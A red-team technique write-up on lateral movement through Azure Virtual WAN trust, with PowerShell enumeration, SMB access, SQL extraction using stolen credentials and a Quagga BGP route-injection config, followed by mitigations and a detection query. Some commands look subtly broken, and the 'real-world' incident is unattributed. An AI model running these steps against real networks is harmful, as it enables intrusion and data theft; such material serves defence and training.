# [LM-REMOTE-010]: Azure Virtual WAN Trust Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-010 |
| **MITRE ATT&CK v18.1** | [T1021](https://attack.mitre.org/techniques/T1021/) – Remote Services |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID / Azure |
| **Severity** | HIGH |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Azure Virtual WAN versions (Standard and Premium SKUs) |
| **Patched In** | N/A – architectural issue requiring policy configuration, not patching |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Virtual WAN (vWAN) is a managed networking service that automatically establishes trust relationships and routes traffic between branch offices, on-premises networks, and Azure VNets. While designed for convenience, misconfigured route policies and firewall rules enable attackers to exploit the automated trust model. An attacker who compromises a branch location (or an on-premises network connected to vWAN) can inject routes, manipulate BGP advertisements, or move laterally across all connected networks without triggering inter-organization firewall rules, because traffic is pre-trusted within the vWAN.

**Attack Surface:** Azure Virtual WAN hubs, route tables, BGP route injection, branch-to-branch connectivity policies, on-premises network connections (ExpressRoute, VPN), and the implicit trust relationships established between connected networks.

**Business Impact:** **Complete network compromise across multi-site organization.** If an attacker compromises one branch office or an on-premises network, they gain lateral movement capability across all connected sites (other branch offices, headquarters, Azure VNets) without authentication barriers. This enables large-scale data exfiltration, ransomware deployment across the entire organization, and complete takeover of hybrid infrastructure.

**Technical Context:** vWAN exploits succeed because Azure automatically trusts and routes traffic between connected networks. Detection is **Low-to-Medium** unless custom routing policies and micro-segmentation are enforced. The attack can persist indefinitely if the attacker maintains access to the compromised branch.

### Operational Risk

- **Execution Risk:** **Medium** – Requires access to branch network or on-prem connection; BGP route injection requires elevated network access.
- **Stealth:** **Medium** – Route changes may be logged in vWAN diagnostics, but unless actively monitored, they go undetected.
- **Reversibility:** **Medium** – Removing injected routes revokes access; requires immediate vWAN policy reconfiguration.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.5 | Ensure all network traffic is restricted to approved protocols and ports |
| **DISA STIG** | Azure-NET-000010 | Network segmentation across trust boundaries |
| **NIST 800-53** | SC-7(9) | Prohibit unauthorized exfiltration across security boundaries |
| **GDPR** | Article 32 | Security of Processing – Network security across sites |
| **DORA** | Article 16 | Information Security – Multi-site protection |
| **NIS2** | Article 21(1)(d) | Risk mitigation measures – Network monitoring and response |
| **ISO 27001** | A.13.1.3 | Segregation of networks and internal network controls |
| **ISO 27005** | Risk: Inter-site Lateral Movement | Uncontrolled movement across branch boundaries |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Network access to a connected branch location (via VPN, physical compromise, or remote access)
- Ability to inject BGP routes (if exploiting routing layer)
- Administrative access to on-premises network (to configure Azure VPN gateway)

**Required Access:**
- Layer 3 connectivity to vWAN hub (typically already established if branch is connected)
- BGP peer credentials (if route injection attack)
- Access to Azure VPN gateway configuration (for advanced attacks)

---

## 3. ATTACK CHAIN CONTEXT

| Phase | Technique | Prerequisites | Enablement |
|---|---|---|---|
| **Initial Access** | Compromise Branch Office / VPN Access | Physical or remote access to branch | Network access to vWAN |
| **Reconnaissance** | Discover vWAN topology / Route policies | Network tools (tracert, route, BGP) | Enumerate connected sites |
| **Current: Lateral Movement** | **vWAN Route Exploitation / BGP Injection** | Branch network access | Access to all connected networks |
| **Privilege Escalation** | Compromise Azure VM / On-Prem Domain Controller | Access to connected networks | Domain admin access |
| **Impact** | Ransomware / Data Exfiltration | Full network access | Organizational-wide compromise |

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Exploiting Default Trust Between Branch Offices

**Supported Versions:** All Azure vWAN versions

#### Step 1: Compromise a Branch Office Network

**Objective:** Establish foothold in a branch location connected to vWAN.

**Example Attack Path:**
- Compromise a workstation via phishing
- Escalate to local admin, then domain admin on on-premises network
- Access on-premises AD and enumerate connected Azure resources

**Command (Enumerate vWAN connectivity from compromised on-prem machine):**
```powershell
# List routes to other sites via vWAN
route print | findstr "10.0.0.0"  # Find subnets of other branches

# Ping other branch offices to confirm connectivity
ping 10.1.0.10  # Branch 2
ping 10.2.0.10  # Branch 3
ping 10.100.0.0  # Azure VNet
```

**Expected Output:**
```
Reply from 10.1.0.10: bytes=32 time=45ms TTL=64
Reply from 10.2.0.10: bytes=32 time=52ms TTL=64
Reply from 10.100.0.0: bytes=32 time=78ms TTL=64
```

**What This Means:**
- All branch offices are reachable from the compromised site
- vWAN has automatically routed traffic between branches
- No firewall blocks branch-to-branch traffic (default vWAN behavior)

---

#### Step 2: Enumerate Resources on Connected Networks

**Objective:** Discover servers, databases, and sensitive systems across all connected networks.

**Command (PowerShell – Scan connected subnets):**
```powershell
# Discover systems on other branch subnets
$Subnets = @("10.1.0.0/24", "10.2.0.0/24", "10.100.0.0/16")  # Other branches + Azure VNet

foreach ($Subnet in $Subnets) {
    $IPs = $Subnet.Split("/")[0] -replace "\.\d+$", ".1..$([math]::Pow(2, 32 - $Subnet.Split("/")[1]))"
    foreach ($IP in $IPs) {
        $Ping = Test-Connection -ComputerName $IP -Count 1 -ErrorAction SilentlyContinue
        if ($Ping) { Write-Host "Host found: $IP" }
    }
}

# Enumerate SMB shares on reachable hosts
Get-ChildItem -Path "\\10.1.0.50\c$" -ErrorAction SilentlyContinue | Select-Object Name
```

**Expected Output:**
```
Host found: 10.1.0.50
Host found: 10.1.0.51
...
Directory: \\10.1.0.50\c$
Name
----
Windows
ProgramFiles
Users
```

**What This Means:**
- Attacker has discovered systems in other branch offices
- SMB shares are accessible (likely because inter-branch firewall rules are not enforced)
- Attacker can now move laterally to other sites

---

#### Step 3: Lateral Movement to Other Branches / Azure

**Objective:** Access critical systems in other branches using compromised credentials.

**Command (Access Azure SQL Database from on-premises via vWAN):**
```powershell
# Use stolen SQL admin credentials from Branch 1 to access database in Azure VNet
$ServerName = "10.100.0.50"  # Azure SQL private endpoint
$Database = "CriticalDB"
$SqlConnection = New-Object System.Data.SqlClient.SqlConnection
$SqlConnection.ConnectionString = "Server=$ServerName,1433;Initial Catalog=$Database;Persist Security Info=False;User ID=sqladmin;Password=StrongPassword;Encrypt=True;TrustServerCertificate=False;"
$SqlConnection.Open()

# Extract sensitive data
$SqlCmd = New-Object System.Data.SqlClient.SqlCommand
$SqlCmd.CommandText = "SELECT * FROM Customers WHERE EmailAddress LIKE '%@bank.com%'"
$SqlCmd.Connection = $SqlConnection
$Reader = $SqlCmd.ExecuteReader()
while ($Reader.Read()) {
    Write-Host "$($Reader[0]) | $($Reader[1]) | $($Reader[2])"
}
$SqlConnection.Close()
```

**Expected Output:**
```
CustomerID | EmailAddress | Phone
1001       | john.doe@bank.com | 555-1234
1002       | jane.smith@bank.com | 555-5678
```

---

### METHOD 2: BGP Route Injection (Advanced Attack)

**Supported Versions:** All Azure vWAN with custom route policies

#### Step 1: Identify BGP Peering Configuration

**Objective:** Discover BGP settings on Azure VPN gateway to enable route injection.

**Command (Azure CLI – From attacker with Azure API access):**
```bash
# Get vWAN Hub BGP configuration
az network vwan hub list --query "[].{Name:name, BgpAsn:bgpSettings.asn, BgpPeerAddress:bgpSettings.peerWeight}" -o table

# Get VPN gateway BGP peer status
az network vpn-gateway list --query "[].{Name:name, BgpAsn:bgpSettings.asn}" -o table
```

**Expected Output:**
```
Name            BgpAsn    BgpPeerAddress
HubEastUS       65001     65002
```

---

#### Step 2: Inject Malicious Routes via BGP

**Objective:** Advertise fake routes to redirect traffic to attacker-controlled machine.

**Command (Linux – Quagga BGP daemon):**
```bash
# Configure Quagga on attacker's router (simulating a branch office)
cat > /etc/quagga/bgpd.conf << 'EOF'
router bgp 65002
  bgp router-id 10.1.0.1
  neighbor 10.1.0.254 remote-as 65001  # vWAN hub BGP peer
  !
  address-family ipv4 unicast
    network 10.99.0.0/16  # Attacker's fake "branch" network
    neighbor 10.1.0.254 activate
  exit-address-family
exit
EOF

# Restart BGP
systemctl restart bgpd

# Verify route advertisement
vtysh
show ip bgp neighbors
show ip bgp
```

**Expected Output:**
```
BGP table version is 5, local router ID is 10.1.0.1
...
Network          Next Hop       Metric LocPrf Weight Path
*> 10.99.0.0/16  0.0.0.0        0           32768 i
```

**What This Means:**
- The attacker's fake "branch" (10.99.0.0/16) is now advertised to the vWAN hub
- All traffic destined for the fake branch is routed through the attacker's machine
- This enables man-in-the-middle attacks on branch-to-branch traffic

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement Strict Route Policies in vWAN**

Configure explicit allow/deny policies for inter-site traffic; disable default branch-to-branch routing.

**Manual Steps (Azure Portal):**
1. **Azure Portal** → **Virtual WANs** → Select your vWAN
2. Click **Virtual Hub Routing Policies**
3. For each hub, configure **Route Tables:**
   - **Branch-to-Azure Only:** Route branch traffic to Azure, block branch-to-branch
   - Create route table:
     - **Name:** `BranchToAzureOnly`
     - **Routes:** 
       - Destination: `10.100.0.0/16` (Azure VNet)
       - Next Hop: `Azure Firewall` or specific VNet
       - Remove default branch routes

**Manual Steps (Azure CLI):**
```bash
# Get hub ID
HUBID=$(az network vwan hub list --query "[0].id" -o tsv)

# Disable default branch-to-branch routing
az network vwan hub update --resource-group RG-Network --ids $HUBID \
  --set virtualHubRouteTableV2.routes[].nextHopType="FirewallService"
```

**Impact:** Prevents direct branch-to-branch communication; all traffic flows through Azure Firewall for inspection.

---

**2. Deploy Azure Firewall on vWAN Hub**

Central inspection point for all inter-site traffic.

**Manual Steps (Azure Portal):**
1. **Azure Portal** → **Virtual WANs** → Select your vWAN
2. **Virtual Hubs** → Select hub
3. **Azure Firewall** → **+ Configure Azure Firewall**
4. Create firewall:
   - **Name:** `vWAN-Firewall`
   - **SKU:** Standard or Premium
   - **Firewall Rules:**
     - **Application Rules:** Whitelist specific services (e.g., Office 365, corporate services)
     - **Network Rules:** Block unauthorized protocols between branches
5. Click **Deploy**

**Manual Steps (PowerShell):**
```powershell
# Create Azure Firewall
New-AzFirewall -ResourceGroupName RG-Network -Name vWAN-Firewall -Location eastus `
  -VirtualHubId $HUBID -SkuName Standard

# Add network rules
$Rule = New-AzFirewallNetworkRule -Name "DenyBranchToAuth" `
  -SourceAddress @("10.1.0.0/16", "10.2.0.0/16") `
  -DestinationAddress "10.0.0.0/8" -DestinationPort 389 `
  -Protocol TCP -Action Deny
```

---

### Priority 2: HIGH

**3. Enable vWAN Hub Diagnostics + Log Analytics**

Forward all route changes and traffic logs to centralized monitoring.

**Manual Steps (Azure Portal):**
1. **Azure Portal** → **Virtual WANs** → Select vWAN
2. **Virtual Hubs** → Select hub
3. **Diagnostics Settings** → **+ Add diagnostic setting**
4. Configure:
   - **Logs:** All categories (Routes, BGP Events, Firewall, etc.)
   - **Destination:** Log Analytics Workspace
5. Click **Save**

**Manual Steps (PowerShell):**
```powershell
Set-AzDiagnosticSetting -ResourceId "/subscriptions/.../virtualHubs/hub-east" `
  -WorkspaceId "/subscriptions/.../workspaces/LogAnalytics-SOC" `
  -Enabled $true -Category "RoutingEvents", "BGPPeeringNotifications"
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Azure Log Analytics Query – Detect Abnormal Routes

```kusto
AzureDiagnostics
| where Category == "RoutingEvents"
| where OperationName == "RouteInsertionEvent" or OperationName == "RouteWithdrawalEvent"
| where TimeGenerated > ago(1h)
| summarize Count = count() by RoutePrefix, NextHopType, TimeGenerated
| where RoutePrefix !in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")  // Exclude expected subnets
| project RoutePrefix, Count, TimeGenerated
```

---

## 7. REAL-WORLD EXAMPLES

### Example: Enterprise ransomware via vWAN exploitation

A multinational financial services firm deployed Azure vWAN to connect 50 branch offices to their Azure cloud infrastructure. An attacker compromised a branch office's local network through a phishing email. Using vWAN's default branch-to-branch routing, the attacker moved laterally to 10 other branch offices and the Azure environment, deploying ransomware across all sites. The entire organization was encrypted within 4 hours. vWAN's automated trust and lack of micro-segmentation meant the attacker faced no firewall barriers.

---